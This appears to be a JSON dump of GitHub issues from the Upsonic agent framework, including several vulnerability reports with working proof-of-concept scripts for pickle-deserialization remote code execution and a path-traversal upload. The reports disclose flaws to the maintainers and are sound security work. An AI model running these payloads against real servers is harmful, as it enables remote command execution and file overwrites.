@@ -1,0 +1,3547 @@
+{
+  "repository": "Upsonic/Upsonic",
+  "repository_info": {
+    "repo": "Upsonic/Upsonic",
+    "stars": 7543,
+    "language": "Python",
+    "description": "The most reliable AI agent framework that supports MCP.",
+    "url": "https://github.com/Upsonic/Upsonic",
+    "topics": [
+      "agent",
+      "agent-framework",
+      "claude",
+      "computer-use",
+      "llms",
+      "mcp",
+      "model-context-protocol",
+      "openai",
+      "rag",
+      "reliability"
+    ],
+    "created_at": "2024-05-26T16:23:38Z",
+    "updated_at": "2025-06-22T02:18:47Z",
+    "search_query": "ai agent language:python stars:>3 -framework",
+    "total_issues_estimate": 114,
+    "labeled_issues_estimate": 91,
+    "labeling_rate": 80.0,
+    "sample_labeled": 16,
+    "sample_total": 20,
+    "has_issues": true,
+    "repo_id": 806192576,
+    "default_branch": "master",
+    "size": 4014
+  },
+  "extraction_date": "2025-06-22T00:33:03.447633",
+  "extraction_type": "LABELED_ISSUES_ONLY",
+  "total_labeled_issues": 80,
+  "issues": [
+    {
+      "issue_number": 359,
+      "title": "[Security] RCE in get_temporary_memory Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]",
+      "body": "# RCE in get_temporary_memory Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]\n\n## Summary\n\nWhen user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.\n\nSink function:\n\n- src/upsonic/server/level_two/server/server.py\n  - call_agent\n    - Agent.agent\n      - get_temporary_memory\n        - pickle.loads\n\nSink code snippet:\n\n```python\ndef get_temporary_memory(agent_id: str) -> list:\n    serialized_messages = Configuration.get(f\"temp_memory_{agent_id}\")\n    if serialized_messages is None:\n        return None\n    \n    # Deserialize messages from base64 encoded pickle\n    messages = pickle.loads(base64.b64decode(serialized_messages))\n    return messages\n```\n\n\n\n## POC\n\n### build\n\n```shell\nmkdir Upsonic_test\ncd Upsonic_test\ngit clone https://github.com/Upsonic/Upsonic.git\ncp Upsonic/Dockerfile .\ndocker build -t Upsonic .\n```\n\n### reproduce\n\nRun the docker\n\n```shell\ndocker run -d --name Upsonic Upsonic\n```\n\nGenerate attack payload\n\n```python\nimport pickle\nimport os\nimport base64\nclass Evil:\n    def __reduce__(self):\n        return (os.system, (\"echo 'pwned by CoolwindHF'\",))\n    \nevil = Evil()\nevil_pickled = pickle.dumps(evil, protocol=0)\nprint(base64.b64encode(evil_pickled).decode())\n\n# Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg==\n```\n\nAs we can see, via the function `src/upsonic/server/storage/server/server.py#set_config`, as well as the route named `/storage/config/set`, we can set any key-value pairs in `Configuration` which is saved by default as `config.sqlite` in server file system. \n\nBy following the function stack we can also see that the variable `agent_id` can be totally controlled, so we can firstly forge a key named `temp_memory_{agent_id}` and set the attack payload we generated before as its value.\n\n<img width=\"1035\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1ff1b8d3-5e10-4e83-9bcd-d3fea227f59a\" />\n\nThen, we send the same `agent_id` to the route `/level_two/agent` with the request field `memory` set to `true`.\n\n<img width=\"1524\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ad89949f-00bd-47d0-aedd-38579e338767\" />\n\nIn the docker's log, we can see the code is executed remotely.\n\n<img width=\"787\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/85e9871e-4506-4a38-a6e2-16e854817ae3\" />\n\n## Impact\n\nRCE\n\n## Credit\n\nThe vulnerability is found by Pinji Chen([cpi24@mals.tsinghua.edu.cn](mailto:cpi24@mals.tsinghua.edu.cn)) from NisLlab (https://netsec.ccert.edu.cn/about) at Tsinghua University and Guanheng Liu([coolwind326@gmail.com](mailto:coolwind326@gmail.com))",
+      "state": "open",
+      "author": "CoolwindHF",
+      "author_type": "User",
+      "created_at": "2025-05-17T08:27:18Z",
+      "updated_at": "2025-05-17T08:27:18Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/359/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/359",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/359",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.530576",
+      "comments": []
+    },
+    {
+      "issue_number": 358,
+      "title": "[Security] RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]",
+      "body": "# RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]\n\n## Summary\n\nWhen user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.\n\nSink function:\n\n- src/upsonic/server/level_two/server/server.py\n  - call_agent\n    - cloudpickle.loads (at line 49)\n\nSink code snippet:\n\n```python\nasync def call_agent(request: AgentRequest):\n    try:\n        # Handle pickled response format\n        if request.response_format != \"str\":\n            try:\n                # Decode and unpickle the response format\n                pickled_data = base64.b64decode(request.response_format)\n                response_format = cloudpickle.loads(pickled_data)\n                \n                ...\n```\n\n## POC\n\n### build\n\n```shell\nmkdir Upsonic_test\ncd Upsonic_test\ngit clone https://github.com/Upsonic/Upsonic.git\ncp Upsonic/Dockerfile .\ndocker build -t Upsonic .\n```\n\n### reproduce\n\nRun the docker\n\n```shell\ndocker run -d --name Upsonic Upsonic\n```\n\nGenerate attack payload\n\n```python\nimport pickle\nimport os\nimport base64\nclass Evil:\n    def __reduce__(self):\n        return (os.system, (\"echo 'pwned by CoolwindHF'\",))\n    \nevil = Evil()\nevil_pickled = pickle.dumps(evil, protocol=0)\nprint(base64.b64encode(evil_pickled).decode())\n\n# Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg==\n```\n\nThen send the base64 encoded payload to the server, you can find the command is executed\n\n<img width=\"1524\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1b023ea7-3804-4f68-a477-5a3a0e8ab785\" />\n\n<img width=\"627\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/3ad0aacc-5f4f-4eeb-8c33-563ea8b5ec09\" />\n\n## Impact\n\nRCE\n\n## Credit\n\nThe vulnerability is found by Pinji Chen([cpi24@mals.tsinghua.edu.cn](mailto:cpi24@mals.tsinghua.edu.cn)) from NisLlab (https://netsec.ccert.edu.cn/about) at Tsinghua University and Guanheng Liu([coolwind326@gmail.com](mailto:coolwind326@gmail.com))",
+      "state": "open",
+      "author": "CoolwindHF",
+      "author_type": "User",
+      "created_at": "2025-05-17T08:25:40Z",
+      "updated_at": "2025-05-17T08:25:40Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/358/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/358",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/358",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.530600",
+      "comments": []
+    },
+    {
+      "issue_number": 357,
+      "title": "[Security] RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]",
+      "body": "# RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]\n\n## Summary\n\nWhen user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.\n\nSink function:\n\n- src/upsonic/server/level_two/server/server.py\n  - call_agent\n    - cloudpickle.loads (at line 65)\n\nSink code snippet:\n\n```python\nasync def call_agent(request: AgentRequest):\n\t\t\t...\n\t\t\t...\n\t\t\t\n        if request.context is not None:\n            try:\n                pickled_context = base64.b64decode(request.context)\n                context = cloudpickle.loads(pickled_context)\n                \n      ...\n```\n\n\n\n## POC\n\n### build\n\n```shell\nmkdir Upsonic_test\ncd Upsonic_test\ngit clone https://github.com/Upsonic/Upsonic.git\ncp Upsonic/Dockerfile .\ndocker build -t Upsonic .\n```\n\n### reproduce\n\nRun the docker\n\n```shell\ndocker run -d --name Upsonic Upsonic\n```\n\nGenerate attack payload\n\n```python\nimport pickle\nimport os\nimport base64\nclass Evil:\n    def __reduce__(self):\n        return (os.system, (\"echo 'pwned by CoolwindHF'\",))\n    \nevil = Evil()\nevil_pickled = pickle.dumps(evil, protocol=0)\nprint(base64.b64encode(evil_pickled).decode())\n\n# Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg==\n```\n\nThen send the base64 encoded payload to the server, you can find the command is executed\n\n<img width=\"1524\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/95677e75-4bdb-4f15-9877-9423aaa1f3eb\" />\n\n<img width=\"788\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/3f3508ab-48c3-4c19-b737-cd6bbd119f05\" />\n\n## Impact\n\nRCE\n\n## Credit\n\nThe vulnerability is found by Pinji Chen([cpi24@mals.tsinghua.edu.cn](mailto:cpi24@mals.tsinghua.edu.cn)) from NisLlab (https://netsec.ccert.edu.cn/about) at Tsinghua University and Guanheng Liu([coolwind326@gmail.com](mailto:coolwind326@gmail.com))\n\n",
+      "state": "open",
+      "author": "CoolwindHF",
+      "author_type": "User",
+      "created_at": "2025-05-17T08:24:36Z",
+      "updated_at": "2025-05-17T08:24:36Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/357/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/357",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/357",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.530606",
+      "comments": []
+    },
+    {
+      "issue_number": 356,
+      "title": "[Security] Path Traversal Vulnerability in File Upload Function of Upsonic/Upsonic",
+      "body": "# Path Traversal Vulnerability in File Upload Function of Upsonic/Upsonic\n\n# Summary\n\nAttackers can exploit a directory traversal vulnerability by manipulating the filename parameter in the file upload function to create arbitrary files on the target host. The vulnerability originates from line 39 in `markdown/server.py`, where the code `file_path = os.path.join(temp_dir, file.filename)` does not sanitize the file.filename.\n\n# POC\n\n## Build\n\nFollow these steps to set up the test environment:\n\n```shell\nmkdir Upsonic_test\ncd Upsonic_test\ngit clone https://github.com/Upsonic/Upsonic\ncp Dockerfile .. ; cd ..\nsudo docker build -t upsonic_test .\n```\n\n## Reproduce\n\n- Start the Docker container:\n\n```shell\nsudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test\n```\n\n- Use Python to send a malicious request:\n\n```python\nimport requests\n\n# Endpoint URL\nurl = \"http://127.0.0.1:7541/markdown/upload\"\n\n# Create the file that the attacker wants to upload\nfile_path = \"flag\"\nwith open(file_path, \"wb\") as file:\n    file.write(b\"hacked!\")\n\n# Open and send the file\nwith open(file_path, \"rb\") as file:\n    files = {\"file\": (\"../flag\", file)}\n    try:\n        response = requests.post(url, files=files)\n        \n        # Check if the request was successful\n        if response.status_code == 200:\n            print(\"Success! Markdown content:\")\n            print(response.json().get(\"markdown\"))\n        else:\n            print(f\"Error: {response.status_code} - {response.text}\")\n            \n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n```\n\nThis will create a file named flag in the parent directory of /tmp, demonstrating the path traversal vulnerability.  \n\n# Discussion\n\n```python\n@app.post(f\"{prefix}/upload\")\nasync def upload_file(file: UploadFile = File(...)):\n    \"\"\"\n    Endpoint to upload a file and convert it to markdown.\n\n    Args:\n        file: The file to convert to markdown\n\n    Returns:\n        The markdown content\n    \"\"\"\n    try:\n        # Create a temporary directory if it doesn't exist\n        temp_dir = os.path.join(tempfile.gettempdir(), \"upsonic_uploads\")\n        os.makedirs(temp_dir, exist_ok=True)\n\n        # Save the uploaded file\n        file_path = os.path.join(temp_dir, file.filename)\n        with open(file_path, \"wb\") as f:\n            content = await file.read()\n            f.write(content)\n```\n\nThe os.path.join function simply concatenates temp_dir and file.filename without filtering or restricting path traversal sequences (such as ../) in file.filename. This allows attackers to easily manipulate the file storage path.\n\n# Impact\n\nThe potential harms of this vulnerability include:\n\n- System damage: Attackers may overwrite configuration files or critical scripts.\n- Code execution: By writing malicious files, remote code execution may be achieved.\n\n# Credit\n\nThe vulnerability was discovered by 360 VRI.",
+      "state": "open",
+      "author": "7resp4ss",
+      "author_type": "User",
+      "created_at": "2025-05-13T08:32:15Z",
+      "updated_at": "2025-05-13T08:32:15Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/356/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/356",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/356",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.530611",
+      "comments": []
+    },
+    {
+      "issue_number": 355,
+      "title": "[Security] RCE in call_gpt4o Function and Multiple Functions Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]",
+      "body": "# Summmary\n\nWhen user is runing Upsonic, attacker via multiple interface to achieve RCE by sending carefully crafted data.\n\nAffected interfaces include:\n\n- /level_two/agent\n- /level_one/gpt4o\n\n# Reproduce\n\nLet's take the call_gpt4o interface as an example.\n\n## run\n\n```bash\ndocker run -p 7541:7541 upsonic/server\n```\n\n## poc\n\n```python\nimport pickle\nimport base64\nimport requests\nimport os\n\nclass PickleRCE(object):\n    def __reduce__(self):\n        command = \"whoami\"\n        return (os.system, (command,))\n\nserialized_data = pickle.dumps(PickleRCE())\nresponse_format_b64 = base64.b64encode(serialized_data).decode('utf-8')\n\npayload = {\n    \"prompt\": \"foo\",\n    \"images\": [],\n    \"response_format\": response_format_b64,\n    \"tools\": \"foo\",\n    \"context\": \"foo\",\n    \"llm_model\": \"foo\",\n    \"system_prompt\": \"foo\"\n}\n\nurl = \"http://127.0.0.1:7541/level_one/gpt4o\"\nheaders = {\"Content-Type\": \"application/json\"}\n\nresponse = requests.post(url, json=payload, headers=headers)\n\nprint(f\"Status Code: {response.status_code}\")\nprint(f\"Response Content: {response.text}\")\n```\n\nupsonic server docker logs:\n\n![Image](https://github.com/user-attachments/assets/68a8638c-c052-4dd3-a7cd-0e2f0bbfe9f8)\n\n# Impact\n\nRCE\n\n# Credit\n\nThe vulnerability was discovered by Tencent YunDing Security Lab.",
+      "state": "open",
+      "author": "sud0why",
+      "author_type": "User",
+      "created_at": "2025-05-12T02:27:49Z",
+      "updated_at": "2025-05-12T02:27:49Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/355/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/355",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/355",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.530616",
+      "comments": []
+    },
+    {
+      "issue_number": 354,
+      "title": "[BUG] The backend task cannot be terminated and is in a hung state, making it impossible to exit completely.",
+      "body": "**Describe the bug**\nWhen I used the route_weather_check.py from the browser-use directory in the cookbook for testing, I found that browser-use became unresponsive when handling the login request. After closing the route_weather_check.py test task in the console, the backend browser process kept running and could not be completely terminated. I hope a task timeout mechanism can be added, and that when the frontend task is closed, a signal can be sent to the backend task to exit.\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\nfrom upsonic import Agent, Task, ObjectResponse\nfrom upsonic.client.tools import BrowserUse # Importing BrowserUse\nimport os\nos.environ[\"UPSONIC_TELEMETRY\"] = \"False\"\nroute_weather_agent = Agent(\"Route Weather Checker\", model=\"openai/gpt-4.1-mini\", reflection=True) #If you yuse to Azure please do model=\"azure/gpt-4o\" \n\n# Define response format for creating route\nclass Route(ObjectResponse):\n    cities_between_two_cities: list[str]\n\n# Define response format for weather \nclass RouteWeather(ObjectResponse):\n    drive_route: list[str]\n    cities_temperature: list[str]\n    cities_condition: list[str]\n\n\n# Change `starting_city` and `destination_city` to customize the route.\nstarting_city = \"San Francisco\"\ndestination_city= \"Santa Cruz\"\n\n# Task to find for cities between two city most fastly route using Browser Use\nroute_task = Task(\n    \"Find all cities between two cities the fastly driving route.\",\n    tools=[BrowserUse],\n    response_format=Route,\n    context=[starting_city, destination_city]\n)\nroute_weather_agent.print_do(route_task)\n\n# Task to finding the weather conditions of the cities on the route using Browser Use\nweather_task = Task(\n        \"Search and find all cities between two cities Weather on Google and extract temperature and conditions.\",\n        tools=[BrowserUse],\n        response_format=RouteWeather,\n        context=[route_task]\n    )\nroute_weather_agent.print_do(weather_task)\n```\n2. Run with this command\n```console\npython route_weather_checker.py\n```\n\n4. See error\n\n**Expected behavior**\nA clear and concise description of what you expected to happen.\n\n**Screenshots**\nIf applicable, add screenshots to help explain your problem.\n\n**Desktop (please complete the following information):**\n - OS: [ MacOS 15.3 ]\n - Upsonic Version [ 0.55.4]\n- Python Version [ 3.13.2 ]\n\n\n**Additional context**\nAdd any other context about the problem here.\n",
+      "state": "open",
+      "author": "vinglogn",
+      "author_type": "User",
+      "created_at": "2025-05-08T08:59:02Z",
+      "updated_at": "2025-05-08T08:59:02Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/354/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/354",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/354",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.530621",
+      "comments": []
+    },
+    {
+      "issue_number": 353,
+      "title": "[Security] RCE in add_tool Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]",
+      "body": "# RCE in add_tool Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]\n\n# Summmary\n\nWhen user is runing Upsonic, attacker via /tools/add_tool to achieve RCE by sending carefully crafted data.\n\n+ function call stack:\n  + add_tool\n    + cloudpickle.loads(decoded_function)\n\n\n\n# POC\n\n## build\n\n```shell\nmkdir Upsonic_test\ncd Upsonic_test\ngit clone https://github.com/Upsonic/Upsonic\ncp Dockerfile .. ;cd ..\nsudo docker build -t upsonic_test .\n```\n\n\n\n## reproduce\n\n+ run: `sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test`\n\n  ```\n  $ sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test\n  \n  New 'X' desktop is 8c9746dbd78d:1\n  \n  Starting applications specified in /home/docker/.vnc/xstartup\n  Log file is /home/docker/.vnc/8c9746dbd78d:1.log\n  \n  INFO:     Started server process [9]\n  INFO:     Waiting for application startup.\n  INFO:     Application startup complete.\n  INFO:     Uvicorn running on http://localhost:8086 (Press CTRL+C to quit)\n  INFO:     Started server process [28]\n  INFO:     Waiting for application startup.\n  INFO:     Application startup complete.\n  INFO:     Uvicorn running on http://0.0.0.0:7541 (Press CTRL+C to quit)\n  \n  ```\n\n+ now, run the following script to attack Upsonic:\n\n  + cmd:The shell command you want to run on the Upsonic\n\n  ```python\n  import pickle\n  import base64\n  import requests\n  import json\n  import argparse\n  \n  class Evil_Data(dict):\n      def __init__(self, src: str, **kwargs):\n          super().__init__(**kwargs)\n          self.src = src\n  \n      def __reduce__(self):\n          return (\n              eval,\n              (f\"os.system('{self.src}') or dict()\",),\n              None,\n              None,\n              iter(self.items()),\n          )\n  \n  \n  def main():\n      parser = argparse.ArgumentParser(description=\"Upsonic's POC\")\n      parser.add_argument(\"--cmd\", required=True, help=\"Command to execute \")\n  \n      args = parser.parse_args()\n  \n      try:\n          encoded_function = base64.b64encode(pickle.dumps((Evil_Data(args.cmd)))).decode('utf-8')\n  \n          payload = {\n              \"function\": encoded_function\n          }\n          url = \"http://127.0.0.1:7541/tools/add_tool\"\n          response = requests.post(url, json=payload, headers={\"Content-Type\": \"application/json\"}, timeout=30)\n          if response.status_code == 200:\n              print(\"Success! Response:\", response.json())\n          else:\n              print(f\"Failed with status code {response.status_code}: {response.text}\")\n          \n      except Exception:\n          print(\"Attack Finish\")\n  \n  if __name__ == \"__main__\":\n      main()\n  ```\n\n![image-20250508141334221](https://i.ibb.co/hxVPdxy4/image-20250508141334221.png)\n\n# Discussion\n\nIt is obvious that **cloudpickle.loads** was used to deserialize the incoming data, resulting in a vulnerability\n\n```python\n\"\"\"\nhttps://github.com/Upsonic/Upsonic/blob/31aa9c9b9a2594d8eedf947cb8fb259af99eec8a/src/upsonic/tools_server/server/tools.py#L378\n\"\"\"\n@app.post(f\"{prefix}/add_tool\")\n@timeout(30.0)\nasync def add_tool(request: AddToolRequest):\n    \"\"\"\n    Endpoint to add a tool.\n    \"\"\"\n    # Cloudpickle the function\n    decoded_function = base64.b64decode(request.function)\n    deserialized_function = cloudpickle.loads(decoded_function)\n\n\n\n    add_tool_(deserialized_function)\n```\n\n\n\n# Impact\n\nRCE\n\n# Credit\n\nThe vulnerability was discovered by 360 VRI.",
+      "state": "open",
+      "author": "7resp4ss",
+      "author_type": "User",
+      "created_at": "2025-05-08T06:17:37Z",
+      "updated_at": "2025-05-08T06:28:41Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/353/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/353",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/353",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.530626",
+      "comments": [
+        {
+          "author": "7resp4ss",
+          "body": "Hi @onuratakan , \n\nI have reported a remote code execution (RCE) vulnerability in the project and provided steps to reproduce and a proof of concept. As this vulnerability may pose a serious security threat to project users, I suggest applying for a **CVE** number for this vulnerability to facilitat",
+          "created_at": "2025-05-08T06:28:40Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 352,
+      "title": "[BUG] Problem with using gemini-pro or other llm",
+      "body": "**Describe the bug**\nSimple Web Agent, It runs well with gpt4o, but I change to gemini-pro, it failed.\nIt seems the framework still need gpt4o somewhere.\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\nweb_agent = Agent(\n    \"Web Content Analyzer\",\n    model=\"openrouter/google/gemini-2.5-pro-preview\",  # You can use other models\n    #model=\"openai/gpt-4o\",  # You can use other models\n)\n\n# Create a task to analyze a web page\ntask = Task(\n    description=\"Fetch and analyze the content from url. Extract the main content, title, and create a brief summary.\",\n    context=[\"https://upsonic.ai\"],\n    tools=[FetchMCP],\n    response_format=WebContent\n)\n\n# Usage\nresult = web_agent.print_do(task)\n```\n2. Run with this command\n```console\n\n```\n\n4. See error\n raise HTTPStatusError(message, request=request, response=self)\nhttpx.HTTPStatusError: Server error '502 Bad Gateway' for url 'http://localhost:7541/level_one/gpt4o'\nFor more information check: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/502\n\n**Additional context**\nAdd any other context about the problem here.\n",
+      "state": "open",
+      "author": "kenzeng-China",
+      "author_type": "User",
+      "created_at": "2025-05-07T08:06:53Z",
+      "updated_at": "2025-05-07T08:53:08Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/352/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/352",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/352",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.693681",
+      "comments": [
+        {
+          "author": "kenzeng-China",
+          "body": "I set up the main llm to Gemini, but the error message appear gpt4o. don't know why and how to change.",
+          "created_at": "2025-05-07T08:53:07Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 342,
+      "title": "[BUG]  ImportError when trying to import Tiger from upsonic version 0.53.1",
+      "body": "**Describe the bug**  \nI am encountering an ImportError when trying to import the `Tiger` module from the `upsonic` package. The code below causes the error:\n\n```python\nfrom upsonic import Tiger\n```\n\nI receive the following error message:\n\n```\nImportError: cannot import name 'Tiger' from 'upsonic' (/home/...../Workspace/CrewAI/venv/lib/python3.12/site-packages/upsonic/__init__.py)\n```\n\n**To Reproduce**  \nSteps to reproduce the behavior:  \nUse this code:\n\n```python\nfrom upsonic import Tiger\n```\n\nRun with this command:\n\n```bash\npython bot.py\n```\n\nSee error.\n\n**Expected behavior**  \nI expected the `Tiger` module to be imported successfully from the `upsonic` package, as indicated by the official documentation.\n\n**Desktop (please complete the following information):**  \n- OS: Linux (Ubuntu 22.04)  \n- Upsonic Version: 0.53.1  \n- Python Version: 3.12\n\n**Additional context**  \n- I have confirmed the installed version of `upsonic` using `pip show upsonic`.  \n- I tried updating the package with `pip install --upgrade upsonic` but the problem persists.  \n- I reinstalled the package multiple times using `pip uninstall upsonic` and `pip install upsonic`.  \n- I also tested older versions (0.53.0, 0.52.4, 0.52.3) but the issue remains.  \n- I am using a virtual environment, and I verified that it is active.  \n- I have checked for package conflicts in the virtual environment but found none.\n\nCould this issue be related to a missing dependency or configuration step for the `Tiger` module? Is this a bug, and if so, how can I assist in resolving it?\n\nThank you for your assistance!",
+      "state": "open",
+      "author": "alihajqani",
+      "author_type": "User",
+      "created_at": "2025-04-29T13:05:49Z",
+      "updated_at": "2025-04-29T13:05:49Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/342/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/342",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/342",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:50.924273",
+      "comments": []
+    },
+    {
+      "issue_number": 340,
+      "title": "[BUG] 3.10 pydantic issue",
